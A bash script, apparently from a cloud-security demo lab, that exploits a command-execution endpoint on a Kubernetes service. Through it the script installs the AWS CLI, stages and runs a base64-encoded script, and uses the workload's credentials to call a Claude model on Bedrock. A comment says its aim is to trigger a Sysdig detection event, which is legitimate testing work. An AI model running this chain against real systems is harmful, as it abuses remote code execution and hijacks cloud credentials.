#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Get Node IP and Port
NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30004 # non-ai-workload service

echo -e "${BLUE}[*] Testing for AWS Bedrock API access...${NC}"

# Check if AWS CLI is installed, if not install it
echo -e "${BLUE}[*] Checking AWS CLI installation...${NC}"
AWS_CHECK=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=/usr/local/bin/aws --version")
if [[ ! $AWS_CHECK == *"aws-cli"* ]]; then
    echo -e "${BLUE}[*] Installing AWS CLI...${NC}"
    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl --connect-timeout 5 https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o awscliv2.zip" > /dev/null
    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=unzip -q awscliv2.zip" > /dev/null
    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=./aws/install" > /dev/null
fi

# Write the AWS command to a file in base64
echo -e "${BLUE}[*] Writing AWS command to file...${NC}"
SCRIPT_CONTENT='#!/bin/bash
/usr/local/bin/aws bedrock-runtime invoke-model \
--model-id anthropic.claude-3-5-sonnet-20241022-v2:0 \
--body "{\"prompt\": \"\n\nHuman: tell me a story\n\nAssistant:\", \"max_tokens_to_sample\" : 300}" \
invoke-model-output.txt \
--region us-east-1 2>&1 | tee /tmp/bedrock-output.log'

# Encode the script to base64
ENCODED_SCRIPT=$(echo "$SCRIPT_CONTENT" | base64 -w 0)
# First write the base64 content to a file
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=echo $ENCODED_SCRIPT > /tmp/encoded.b64"
# Then decode from one file to another, capturing any potential errors
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=base64 -d /tmp/encoded.b64 > /tmp/bedrock-test.sh 2> /tmp/decode.err"

# Make the file executable
echo -e "${BLUE}[*] Making script executable...${NC}"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 755 /tmp/bedrock-test.sh'

# Run the script
echo -e "${BLUE}[*] Running the script...${NC}"
RESPONSE=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/tmp/bedrock-test.sh')


# NOTE(curtis - don't remove this comment): This is not actually going to allow
# the user to access the Bedrock API, but it will fire off a Sysdig Secure event
# for Bedrock reconnaissance.

if [[ $RESPONSE == *"on-demand throughput"* ]]; then
    echo
    echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║      VULNERABLE: Application has Bedrock API access!   ║${NC}"
    echo -e "${GREEN}║            Successfully called InvokeModel             ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
    echo 
else
    echo -e "\n${RED}[+] Not vulnerable to Bedrock API access${NC}"
fi 